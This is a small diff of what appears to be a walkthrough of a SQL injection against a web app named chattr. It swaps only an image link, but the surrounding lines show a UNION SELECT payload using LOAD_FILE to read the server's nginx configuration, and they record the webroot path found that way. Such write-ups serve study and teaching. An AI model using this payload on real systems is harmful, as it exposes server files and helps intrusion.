@@ -141,7 +141,7 @@ Next, lets see what permissions are avalible with the payload:
 
         ') UNION SELECT 1,2,LOAD_FILE("/etc/nginx/sites-enabled/default"),4-- -
 
-<img width="1002" height="583" alt="webroot" src="https://github.com/user-attachments/assets/a1e9945f-fe95-475a-90ab-deb37a2aadd0" />
+<img width="1002" height="562" alt="webroot" src="https://github.com/user-attachments/assets/91507a96-0ee2-4bc7-8514-81c07c61c60e" />
 
 - The webroot is: /var/www/chattr-prod
 
